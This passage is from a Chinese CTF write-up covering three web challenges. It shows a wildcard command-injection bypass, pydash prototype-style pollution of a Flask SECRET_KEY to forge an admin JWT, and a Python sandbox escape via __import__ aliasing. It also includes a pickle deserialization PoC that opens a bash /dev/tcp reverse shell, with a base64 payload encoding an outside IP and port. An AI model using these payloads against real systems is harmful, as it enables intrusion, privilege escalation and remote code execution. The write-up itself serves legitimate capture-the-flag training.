Origin: http://5000-619ff4e9-af14-449e-b4c3-d54563a9466b.challenge.ctfplus.cn
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: _ga=GA1.1.933745157.1792840359; _clck=indf3y%5E2%5Egar%5E0%5E2488; _clsk=142yr3t%5E1793458804668%5E11%5E1%5Et.clarity.ms%2Fcollect; _ga_BFDVYZJ3DE=GS2.1.s1793455829$o8$g1$t1793458805$j35$l0$h0; sweet=sweet
Connection: keep-alive

{"web": "flag","bbb":"flag"}
```
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261031232851479.png)
### ez_64
只能使用/ ? . 空格 f l a 6 4字符，用通配符绕过白名单过滤进行RCE用/???/?a??64匹配/bin/base64，fla?.???匹配flag.php，合起来就会读取flag.php并用base64编码输出(刚开始fla拼反成fal了，导致死活出不来，改了半天才发现单词拼错了，伤心 )
payload：
```
/???/?a??64%20fla?.???
```
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261101000254188.png)
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261101000415070.png)
### pollute the key
查看源码，发现/api/user/update存在污染漏洞，pydash.set_可以深度设置嵌套对象属性，可以巧妙的修改key使得value覆盖其他变量，由于函数pydash.set_后面重新又把role赋值回去，所以没办法直接污染role获得权限，但是可以污染SECRET_KEY然后伪造jwt。
为了访问到全局变量SECRET_KEY要先访问__globals__。
User类里有一个profile方法，可以通过该方法访问\_\_globals__。也可以通过\_\_class\_\_.\_\_init__（先访问类的在访问初始化属性）或\_\_init__（直接访问类的初始化属性）访问__globals__
```python
@app.route("/api/user/update", methods=["POST"])
def api_user_update():
    payload = current_user()
    if not payload:
        return jsonify({"ok": False, "msg": "请先登录"}), 401

    me = USERS.get(payload.get("username"))
    if not me:
        return jsonify({"ok": False, "msg": "用户不存在"}), 401

    data = request.get_json(silent=True) or {}
    key = data.get("key")
    value = data.get("value")
    if not isinstance(key, str) or not key:
        return jsonify({"ok": False, "msg": "参数错误"}), 400

    if "__builtins__" in key:
        return jsonify({"ok": False, "msg": "字段路径非法: 该路径被禁止修改"}), 400

    username, role = me.username, me.role
    try:
        pydash.set_(me, key, value)
    except Exception as e:
        return jsonify({"ok": False, "msg": "字段路径非法: %s" % e}), 400

    me.username, me.role = username, role

```
```python
class User:
    def __init__(
        self, username, password, role="user", email="", phone="", nickname=""
    ):
        self.username = username
        self.salt = os.urandom(16).hex()
        self.password = hash_password(password, self.salt)
        self.role = role
        self.email = email
        self.phone = phone
        self.nickname = nickname

    def profile(self):
        return {
            "username": self.username,
            "role": self.role,
            "email": self.email,
            "phone": self.phone,
            "nickname": self.nickname,
        }

```
payload如下
```json
{"key":"profile.__globals__.SECRET_KEY","value":"utakata"}
```
或
```json
{"key":"__init__.__globals__.SECRET_KEY","value":"utakata"}
```
或
```json
{"key":"__class__.__init__.__globals__.SECRET_KEY","value":"utakata"}
```
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261101005722135.png)
伪造jwt
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261101005737989.png)
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261101005757586.png)
成功提权
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261101013353382.png)
根据源代码，发现/api/order/buy里存在pickle反序列化漏洞
```python
@app.route("/api/order/buy", methods=["POST"])
def api_order_buy():
    payload = current_user()
    if not payload:
        return jsonify({"ok": False, "msg": "请先登录"}), 401
    if payload.get("role") != "admin":
        return jsonify({"ok": False, "msg": "下单结算仅对管理员（admin）开放"}), 403

    raw = request.form.get("cart") or ""
    if not raw:
        return jsonify({"ok": False, "msg": "缺少 cart 参数"}), 400
    try:
        cart = pickle.loads(base64.b64decode(raw))
    except Exception as e:
        return jsonify({"ok": False, "msg": "购物车数据无法解析: %s" % e}), 400

    if not isinstance(cart, list):
        return jsonify({"ok": False, "msg": "购物车格式错误"}), 400

    by_id = {p["id"]: p for p in PRODUCTS}
    items, total = [], 0.0
    for pid in cart:
        p = by_id.get(pid)
        if p:
            items.append(p)
            total += p["price"]
    if not items:
        return jsonify({"ok": False, "msg": "购物车里没有有效商品"}), 400

```
poc如下，生成执行shell反弹的代码的序列化结果(base64编码过)
```python
import pickle
import os
import base64
import subprocess

class RCE:
    def __reduce__(self):
        cmd = "bash -c 'sh -i >& /dev/tcp/IP/port 0>&1'"
        return (subprocess.getoutput, (cmd,))

payload = pickle.dumps(RCE(), protocol=0, fix_imports=False)
assert b"\x00" not in payload
assert b"\x1e" not in payload
#assert b"os" not in payload
#assert b"builtins" not in payload
print(base64.b64encode(payload).decode())
```
payload如下
```
cart=Y3N1YnByb2Nlc3MKZ2V0b3V0cHV0CnAwCihWYmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvOC4xMzguMjMuMTQ3Lzc3NzcgMD4mMScKcDEKdHAyClJwMwou
```
成功拿到shell
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261101013144253.png)
发现flag
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261101013216220.png)
### 漏风的沙箱
这题直接给了我们写python代码的地方，但显然是有过滤的。代码审计后发现有正则黑名单，AST Visitor 黑名单。ast过滤里面定义了如下回调方法
```python
visit_Import      #遍历访问import节点
visit_ImportFrom  #遍历访问from import节点
visit_Attribute   #变例访问属性引用节点
visit_Call        #遍历访问函数调用节点
visit_Subscript   #遍历访问下标访问节点
```
要想通过python执行rce一定要通过import加载其他模块如os，subprocess等。正则的黑名单里过滤了import 和__import__(   但是没有过滤__import__于是考虑用这个加载os模块
先不考虑ast的黑名单，执行env并回显的payload应该是
print(\_\_import\_\_('os').popen('env').read())
\_\_import\_\_( 不仅被正则拦下，还会被Visit_Call拦下，.popen和.read会被Visit_Attributr拦下
绕过思路
- 可以把\_\_import\_\_赋值给不在 BANNED_FUNCTIONS里的变量f，在调用f('os')
- 用\_\_dict\_\_把popen放到字典里查找，这样就可以用字符串拼接绕过黑名单
- read()只是用来读取读子进程的stdout，可以用join，readline，read_bytes，\_\_next\_\_，\_\_iter\_\_等方法替代

payload如下
```python
f = __import__
o = f('os')
d = o.__dict__
print(''.join(d['po'+'pen']('env')))
```
或者不执行命令直接用os的environ尝试读取FLAG
```python
f = __import__
o = f('os')
print(o.environ['FLAG'])
```
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261101180641293.png)
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261101181633760.png)